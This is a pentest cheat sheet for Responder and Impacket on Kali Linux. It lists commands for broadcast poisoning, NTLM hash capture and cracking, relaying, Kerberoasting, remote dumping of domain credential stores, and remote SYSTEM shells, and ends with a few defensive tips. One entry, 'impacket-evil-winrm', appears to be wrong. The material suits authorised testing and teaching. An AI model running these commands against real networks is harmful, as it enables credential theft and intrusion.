# Responder & Impacket (`impacket-*`) — Kali AD & Internal Network Toolkit

> **TL;DR:** **Responder** poisons LLMNR/NBT-NS/mDNS broadcasts on a local network to capture NTLMv2 hashes. **Impacket** (exposed in Kali as `impacket-*` commands) provides Python-based SMB, WMI, Kerberos, and RPC tools for relaying, credential dumping, and remote execution.

---

## Installation & Availability in Kali Linux
Both are pre-installed (or available via `apt`) on Kali Linux:
```bash
sudo apt install -y responder python3-impacket impacket-scripts
```

---

## 1. Responder — LLMNR / NBT-NS Poisoning

When a Windows host mistypes a file share (e.g., `\\filesvr\share`) and DNS fails, it falls back to broadcasting via **LLMNR/NBT-NS**. Responder answers and captures the user's Net-NTLMv2 hash.

| Command | Purpose |
|---------|---------|
| `sudo responder -I eth0 -A` | **Analyze mode** (passive—listen only without poisoning; safe for initial recon!) |
| `sudo responder -I eth0 -wd` | Active poisoning on `eth0` (`-w` WPAD, `-d` DHCP) |
| `ls /usr/share/responder/logs/` | View captured Net-NTLMv2 hashes |
| `hashcat -m 5600 NetNTLMv2.txt /usr/share/wordlists/rockyou.txt` | Crack captured Net-NTLMv2 hashes offline |

---

## 2. Impacket (`impacket-*`) — Essential Kali Commands

In Kali, you don't need to hunt for `.py` scripts—just type `impacket-` and hit `Tab`:

| Kali Command | Purpose & Example |
|--------------|-------------------|
| `impacket-smbserver share . -smb2support` | Host a temporary SMB share from Kali to transfer files to Windows targets |
| `impacket-ntlmrelayx -tf targets.txt -smb2support` | Relay captured NTLM auth to targets lacking SMB Signing (combine with Responder HTTP/SMB off) |
| `impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.10.10.10 -no-pass` | **AS-REP Roasting:** Extract hashes for users without Kerberos pre-auth |
| `impacket-GetUserSPNs corp.local/user:Pass123 -dc-ip 10.10.10.10 -request` | **Kerberoasting:** Request TGS tickets for service accounts to crack offline (`hashcat -m 13100`) |
| `impacket-secretsdump corp.local/admin:Pass123@10.10.10.10` | Dump SAM, LSA secrets, and AD `NTDS.dit` hashes remotely |
| `impacket-psexec corp.local/admin:Pass123@10.10.10.10` | Get an interactive `SYSTEM` shell over SMB (noisy—writes a service binary) |
| `impacket-wmiexec corp.local/admin:Pass123@10.10.10.10` | Stealthier semi-interactive shell over WMI (no binary dropped) |
| `impacket-evil-winrm` *(or `evil-winrm -i 10.10.10.10 -u admin -p Pass123`)* | Interactive PowerShell shell over WinRM (Port `5985`) |

---

## Common Pitfalls & Defensive Notes
- **Responder + `ntlmrelayx` Conflict:** If you run `impacket-ntlmrelayx`, edit `/etc/responder/Responder.conf` and set `SMB = Off` and `HTTP = Off` so Responder doesn't steal ports `445`/`80` from `ntlmrelayx`.
- **Defensive Tip:** Disable **LLMNR** and **NBT-NS** via GPO, enforce **SMB Signing** on all hosts, and monitor for `Event ID 7045` (new service created by `psexec`) and `Event ID 4769` with RC4 (`0x17`) for Kerberoasting.
